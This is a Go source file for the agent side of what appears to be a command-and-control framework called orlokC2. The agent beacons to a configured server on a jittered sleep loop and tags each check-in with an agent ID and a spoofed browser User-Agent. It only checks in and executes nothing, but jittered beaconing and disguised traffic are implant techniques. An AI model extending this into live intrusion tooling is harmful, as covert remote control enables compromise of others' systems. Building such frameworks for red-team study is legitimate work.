package agent

import (
	"fmt"
	"github.com/faanross/orlokC2/internal/agent/config"
	"log"
	"math/rand"
	"net/http"
	"time"
)

type Agent struct {
	Config *config.Config

	client *http.Client

	stopChan chan struct{}

	running   bool
	connected bool
}

func NewAgent(config *config.Config) *Agent {
	return &Agent{
		Config: config,
		client: &http.Client{
			Timeout: config.RequestTimeout},
		stopChan:  make(chan struct{}),
		running:   false,
		connected: false,
	}
}

func (a *Agent) Start() error {
	if a.running {
		return fmt.Errorf("agent already running")
	}
	a.running = true
	go a.runLoop()

	return nil
}

func (a *Agent) Stop() error {
	if !a.running {
		return fmt.Errorf("agent is already not running")
	}
	close(a.stopChan)
	a.running = false

	fmt.Println("agent stopped")
	return nil
}

func (a *Agent) runLoop() {
	for {
		select {
		case <-a.stopChan:
			return
		default:
			sleepTime := a.CalculateSleepWithJitter()

			// Connect
			err := a.Connect()
			if err != nil {
				log.Printf("Error connecting to agent: %v\n", err)
				time.Sleep(sleepTime)
				continue
			}

			// Send request
			resp, err := a.SendRequest(a.Config.Endpoint)
			if err != nil {
				log.Printf("Error sending request: %v\n", err)
				time.Sleep(sleepTime)
				continue
			}

			// Process response
			resp.Body.Close()

			// Sleep
			time.Sleep(sleepTime)
		}
	}
}

func (a *Agent) Connect() error {
	url := fmt.Sprintf("http://%s/", a.GetTargetAddress())

	req, err := http.NewRequest("HEAD", url, nil)
	if err != nil {
		return fmt.Errorf("Error creating request: %v\n", err)
	}

	resp, err := a.client.Do(req)
	if err != nil {
		return fmt.Errorf("Error connecting to agent: %v\n", err)
	}
	defer resp.Body.Close()

	a.connected = true
	return nil
}

func (a *Agent) GetTargetAddress() string {
	return fmt.Sprintf("%s:%s", a.Config.TargetHost, a.Config.TargetPort)
}

func (a *Agent) SendRequest(endpoint string) (*http.Response, error) {
	if !a.connected {
		return nil, fmt.Errorf("agent not connected")
	}

	url := fmt.Sprintf("http://%s%s", a.GetTargetAddress(), endpoint)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("Error creating request: %v\n", err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("X-Agent-ID", a.Config.AgentUUID)

	resp, err := a.client.Do(req)
	if err != nil {
		a.connected = false
		return nil, fmt.Errorf("Error connecting to agent: %v\n", err)
	}
	return resp, nil

}

func (a *Agent) CalculateSleepWithJitter() time.Duration {
	jitterFactor := 1.0 + (rand.Float64() * a.Config.Jitter / 100.0)
	return time.Duration(float64(a.Config.Sleep) * jitterFactor)
}
